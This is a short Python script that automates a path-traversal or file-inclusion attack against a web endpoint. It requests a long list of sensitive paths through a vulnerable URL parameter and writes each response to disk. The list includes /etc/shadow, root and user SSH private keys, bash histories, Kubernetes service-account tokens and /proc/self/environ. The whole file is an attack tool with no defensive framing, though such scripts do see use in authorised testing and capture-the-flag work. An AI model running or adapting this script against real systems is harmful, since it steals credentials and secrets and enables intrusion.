import requests
from pathlib import Path


def get_files(url_head="http://localhost/?a=..", username=None):
    filepaths = [
        # User
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        # Shell
        "/root/.bash_history",
        "/root/.bashrc",
        "/root/.bash_profile",
        # SSH
        "/root/.ssh/authorized_keys",
        "/root/.ssh/known_hosts",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub",
        "/root/.ssh/id_rsa.keystore",
        # Apache
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/error.log",
        "/usr/local/apache/log/error_log",
        "/usr/local/apache2/log/error_log",
        "/etc/httpd/logs/access_log",
        "/etc/httpd/conf/httpd.conf",
        # Docker, Kubernetes
        "/.dockerenv",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        # Others
        "/proc/version",
        "/proc/sched_debug",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/net/route",
        "/proc/net/tcp",
        "/proc/net/udp",
        "/proc/net/fib_trie",
        "/proc/devices",
        "/proc/diskstats",
        "/proc/filesystems",
        "/proc/interrupts",
        "/proc/iomem",
        "/proc/ioports",
        "/proc/kmsg",
        "/proc/meminfo",
        "/proc/modules",
        "/proc/partitions",
        "/proc/net/nf_conntrack",
        "/proc/scsi",
        "/proc/slabinfo",
        "/proc/swaps",
        "/proc/sysvipc",
        "/proc/tty",
        "/proc/uptime",
        "/var/log/vsftpd.log",
        "/var/log/dmessage",
        "/dev/termination-log",
        "/etc/mtab",
        "/etc/inetd.conf",
        "/etc/issue",
        "/etc/motd",
        "/etc/resolv.conf",
        "/proc/self/gid_map",
        "/proc/self/mount_info",
        "/proc/self/mountstats",
        "/proc/self/ns",
        "/proc/self/personality",
        "/proc/self/stack",
        "/proc/config.gz",
        "/proc/execdomains",
        "/proc/ioports",
        "/proc/keys",
        "/proc/net/dev",
        "/proc/net/dev_mcast",
        "/proc/net/igmp",
        "/proc/net/rarp",
        "/proc/net/raw",
        "/proc/net/snmp",
        "/proc/net/unix",
        "/proc/sys",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
        "/proc/self/comm",
        "/proc/self/exe",
        "/proc/self/fdinfo",
        "/proc/self/maps",
        "/proc/self/root",
        "/proc/self/status",
        "/proc/self/task",
        "/proc/self/mem",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/cwd",
        "/proc/self/attr/current",
        "/proc/self/cgroup",
    ]

    if username is not None:
        filepaths.extend(
            [
                f"/home/{username}/.bash_history",
                f"/home/{username}/.bashrc",
                f"/home/{username}/.bash_profile",
                f"/home/{username}/.ssh/authorized_keys",
            ]
        )

    d = Path("results")
    d.mkdir(exist_ok=True)
    for path in filepaths:
        print(path)
        url = url_head + path
        result = requests.get(url)
        file = d / path.replace("/", "_")
        file.open("w").write(result.text)
